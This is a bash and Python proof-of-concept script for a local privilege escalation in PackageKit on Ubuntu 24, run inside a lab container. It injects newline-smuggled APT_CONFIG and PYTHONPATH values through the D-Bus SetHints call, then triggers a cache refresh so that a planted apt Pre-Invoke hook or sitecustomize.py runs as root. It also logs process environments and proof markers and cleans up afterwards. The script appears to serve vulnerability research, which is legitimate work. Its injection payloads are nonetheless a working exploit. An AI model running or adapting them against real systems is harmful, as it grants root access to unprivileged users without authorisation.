#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/packagekit-sethints-env.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

tmp=/tmp/packagekit-sethints-env
home=/home/selfauth/packagekit-sethints-env
root_marker=/root/packagekit_sethints_env_root
py_marker=/root/packagekit_sethints_env_pythonpath_root
export_log=/tmp/packagekit-sethints-env-root.out
console=9

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  rm -rf "$tmp" "$home" "$root_marker" "$py_marker"
  systemctl restart packagekit.service >/dev/null 2>&1 || true
  systemctl reset-failed packagekit.service >/dev/null 2>&1 || true
}

rm -rf "$tmp" "$home" "$root_marker" "$py_marker" "$export_log"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

trap cleanup_target EXIT

cat >"$tmp/evil-apt.conf" <<'EOF'
APT::Update::Pre-Invoke { "id > /root/packagekit_sethints_env_root"; };
EOF
chmod 0644 "$tmp/evil-apt.conf"
mkdir -p "$tmp/py"
cat >"$tmp/py/sitecustomize.py" <<'PYEOF'
import os
os.system("id > /root/packagekit_sethints_env_pythonpath_root")
PYEOF
chmod -R a+rX "$tmp/py"

{
  echo "## target/default proof"
  cat /etc/os-release | sed -n '1,8p'
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \
    python3-gi apt dbus polkitd systemd 2>&1 | sort
  echo

  echo "## PackageKit service and SetHints docs"
  systemctl cat packagekit.service --no-pager
  awk '/method name="SetHints"/,/<\/method>/' /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml | sed -n '1,90p'
  awk '/org.freedesktop.packagekit.system-sources-refresh/{flag=1} flag{print} /<\/action>/{if(flag) exit}' /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy
  echo

  echo "## evil apt config"
  ls -l "$tmp/evil-apt.conf"
  cat "$tmp/evil-apt.conf"
} >"$tmp/root-prep.out" 2>&1

cat >"$tmp/monitor.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/packagekit-sethints-env/monitor.out
: > "$out"
end=$((SECONDS + 70))
seen=/tmp/packagekit-sethints-env/seen
: > "$seen"
while [ "$SECONDS" -lt "$end" ]; do
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}
    [ -r "$p/cmdline" ] || continue
    cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null)
    case "$cmd" in
      *packagekitd*|*apt*|*gpgv*|*debconf*|*dpkg*|*appstream*|*http*|*https*)
        key="$pid:$cmd"
        if ! grep -Fqx "$key" "$seen" 2>/dev/null; then
          echo "$key" >> "$seen"
          {
            echo "### PID=$pid CMD=$cmd"
            awk '/^Uid:|^Gid:|^CapEff:|^NoNewPrivs:/{print}' "$p/status" 2>/dev/null
            tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -E '^(APT_CONFIG|PK_HINT|LANG|LC_|LANGUAGE|http_proxy|https_proxy|ftp_proxy|no_proxy|DEBIAN_FRONTEND|DEBCONF_PIPE|PATH|HOME|TMPDIR)=' || true
            python3 - "$p/environ" <<'PY' 2>/dev/null || true
import sys
data = open(sys.argv[1], "rb").read().split(b"\0")
needles = (b"APT_CONFIG", b"PK_HINT", b"PYTHONPATH", b"LANG=", b"LANGUAGE=")
for entry in data:
    if any(n in entry for n in needles):
        print("ENV_ENTRY_REPR=" + repr(entry))
PY
          } >> "$out"
        fi
        ;;
    esac
  done
  sleep 0.03
done
SH
chmod 0755 "$tmp/monitor.sh"

cat >"$home/probe.py" <<'PY'
#!/usr/bin/env python3
import os
import sys

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
PK = "org.freedesktop.PackageKit"
TX = "org.freedesktop.PackageKit.Transaction"

conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

def call(path, iface, method, params=None, timeout=30000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)

def scenario(label, hints):
    print(f"== scenario {label} ==", flush=True)
    tx = call(ROOT, PK, "CreateTransaction", None, 10000).unpack()[0]
    print(f"tx={tx}", flush=True)
    try:
        call(tx, TX, "SetHints", GLib.Variant("(as)", (hints,)), 10000)
        print(f"SetHints ok {hints!r}", flush=True)
    except GLib.Error as exc:
        print(f"SetHints error {exc.message}", flush=True)
        return
    def sig(_conn, _sender, _path, _iface, signal, params):
        print(f"signal {signal} {params.unpack()}", flush=True)
        if signal in ("Finished", "ErrorCode"):
            GLib.timeout_add(500, loop.quit)
    sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, sig)
    try:
        call(tx, TX, "RefreshCache", GLib.Variant("(b)", (True,)), 10000)
        print("RefreshCache method-return", flush=True)
    except GLib.Error as exc:
        print(f"RefreshCache error {exc.message}", flush=True)
        conn.signal_unsubscribe(sub)
        return
    loop = GLib.MainLoop()
    GLib.timeout_add(35000, loop.quit)
    loop.run()
    conn.signal_unsubscribe(sub)

evil = "/tmp/packagekit-sethints-env/evil-apt.conf"
scenarios = [
    ("locale-newline", [
        f"locale=C.UTF-8\nAPT_CONFIG={evil}\nPK_HINT_SPLIT=1",
        "interactive=true",
        "background=false",
        "cache-age=1",
    ]),
    ("cache-age-newline", [
        "locale=C.UTF-8",
        f"cache-age=1\nAPT_CONFIG={evil}\nPK_HINT_CACHE_SPLIT=1",
        "interactive=true",
        "background=false",
    ]),
    ("locale-pythonpath-newline", [
        f"locale=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1",
        "interactive=true",
        "background=false",
        "cache-age=1",
    ]),
    ("unknown-newline", [
        "locale=C.UTF-8",
        f"pk-hint-probe=x\nAPT_CONFIG={evil}\nPK_HINT_UNKNOWN_SPLIT=1",
        "interactive=true",
        "background=false",
        "cache-age=1",
    ]),
]

print("uid", os.getuid(), "gid", os.getgid(), flush=True)
print("XDG_SESSION_ID", os.environ.get("XDG_SESSION_ID"), flush=True)
for label, hints in scenarios:
    scenario(label, hints)
PY
chmod 0755 "$home/probe.py"
chown -R selfauth:selfauth "$home"

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/packagekit-sethints-env/user.out
: >"$out"
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
python3 /home/selfauth/packagekit-sethints-env/probe.py
SH
chmod 0755 "$home/probe.sh"
chown selfauth:selfauth "$home/probe.sh"

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/packagekit-sethints-env/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl restart packagekit.service >/dev/null 2>&1 || true
"$tmp/monitor.sh" &
monpid=$!
systemctl stop "getty@tty${console}.service" >/dev/null 2>&1 || true
timeout 180 openvt -c "$console" -s -f -w -- /bin/login -f selfauth || true
systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
wait "$monpid" || true

{
  cat "$tmp/root-prep.out"
  echo
  echo "## active selfauth trigger"
  cat "$tmp/user.out" 2>&1 || true
  echo
  echo "## root environment monitor hits"
  grep -E 'APT_CONFIG|PK_HINT|LANG|LC_|packagekitd|apt|gpgv|debconf|dpkg' "$tmp/monitor.out" | sed -n '1,260p' || true
  echo
  echo "## root proof checks"
  if [ -e "$root_marker" ]; then
    echo "ROOT_PROOF_PRESENT $root_marker"
    ls -l "$root_marker"
    cat "$root_marker"
  else
    echo "ROOT_PROOF_ABSENT $root_marker"
  fi
  if [ -e "$py_marker" ]; then
    echo "PYTHONPATH_ROOT_PROOF_PRESENT $py_marker"
    ls -l "$py_marker"
    cat "$py_marker"
  else
    echo "PYTHONPATH_ROOT_PROOF_ABSENT $py_marker"
  fi
  echo
  echo "## cleanup health before cleanup"
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1

cp "$tmp/root.out" "$export_log"

{
  echo
  echo "## cleanup verification"
  cleanup_target
  test ! -e "$root_marker" && echo root_marker_absent
  test ! -e "$py_marker" && echo py_marker_absent
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >>"$export_log" 2>&1

trap - EXIT
EOS

docker exec "$container" cat /tmp/packagekit-sethints-env-root.out > "$log"
docker exec "$container" rm -rf /tmp/packagekit-sethints-env /tmp/packagekit-sethints-env-root.out
sed -n '1,320p' "$log"
